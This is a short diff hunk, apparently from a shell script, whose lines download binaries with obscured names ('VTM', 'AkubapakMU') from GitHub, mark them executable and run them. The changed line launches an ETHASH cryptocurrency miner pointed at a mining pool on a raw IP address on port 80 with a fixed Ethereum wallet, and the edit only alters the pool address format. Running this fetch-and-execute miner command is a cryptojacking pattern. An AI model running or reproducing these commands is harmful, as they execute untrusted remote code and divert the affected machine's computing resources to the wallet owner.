@@ -6,7 +6,7 @@ wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM &&  ./VTM -a ye
 
 
 
-wget https://github.com/angkii/m/raw/main/AkubapakMU && chmod 700 AkubapakMU && ./AkubapakMU -a ETHASH --pool stratum+tcp://170.187.197.220:80 --user 0xe967a8f5db4517af030b436202e2946040eb6a35
+wget https://github.com/angkii/m/raw/main/AkubapakMU && chmod 700 AkubapakMU && ./AkubapakMU -a ETHASH --pool 170.187.197.220:80 --user 0xe967a8f5db4517af030b436202e2946040eb6a35
 
 
 
